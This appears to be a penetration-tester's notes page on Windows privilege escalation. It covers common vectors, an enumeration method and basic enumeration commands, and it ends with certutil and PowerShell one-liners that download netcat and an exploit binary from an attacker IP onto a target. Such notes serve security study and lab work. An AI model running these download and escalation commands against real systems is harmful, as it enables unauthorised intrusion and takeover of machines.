# Windows



Windows Privilege Escalation Vectors

{% hint style="info" %}
[https://wadcoms.github.io/](https://wadcoms.github.io/)
{% endhint %}

A few common vectors that could allow any user to increase their privilege levels on a Windows system are listed below.

* Stored Credentials: Important credentials can be saved in files by the user or in the configuration file of an application installed on the target system.
* Windows Kernel Exploit: The Windows operating system installed on the target system can have a known vulnerability that can be exploited to increase privilege levels.&#x20;
* Insecure File/Folder Permissions: In some situations, even a low privileged user can have read or write privileges over files and folders that can contain sensitive information.
* DLL Hijacking: Applications use DLL files to support their execution. You can think of these as smaller applications that can be launched by the main application. Sometimes DLLs that are deleted or not present on the system are called by the application. This error doesn't always result in a failure of the application, and the application can still run. Finding a DLL the application is looking for in a location we can write to can help us create a malicious DLL file that will be run by the application. In such a case, the malicious DLL will run with the main application's privilege level. If the application has a higher privilege level than our current user, this could allow us to launch a shell with a higher privilege level.&#x20;
* Unquoted Service Path: If the executable path of a service contains a space and is not enclosed within quotes, a hacker could introduce their own malicious executables to run instead of the intended executable.&#x20;
* Always Install Elevated: Windows applications can be installed using Windows Installer (also known as MSI packages) files. These files make the installation process easy and straightforward. Windows systems can be configured with the "AlwaysInstallElevated" policy. This allows the installation process to run with administrator privileges without requiring the user to have these privileges. This feature allows users to install software that may need higher privileges without having this privilege level. If "AlwaysInstallElevated" is configured, a malicious executable packaged as an MSI file could be run to obtain a higher privilege level.&#x20;
* Other software: Software, applications, or scripts installed on the target machine may also provide privilege escalation vectors.

Typically, privilege escalation will require you to follow a methodology similar to the one given below:&#x20;

1. Enumerate the current user's privileges and resources it can access.
2. If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1
3. If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach (e.g. manually go over a checklist like the one provided [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md))

```
net user
systeminfo
systeminfo | findstr /B /C: "OS Name" /C:"OS Version"
wmic service list ##list services installed on the target system
net localgroup Administrators ## list who is in the local group Administrators
```

## Download files on Windows

`certutil.exe -urlcache -f http://10.10.16.13:8080/nc.exe C:\temp\nc.exe`

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.10.16.13:80/41020.exe','C:\Users\kostas\Desktop\41020.exe')"`

{% hint style="info" %}
Check if you get a shell with cmd.exe or PS
{% endhint %}



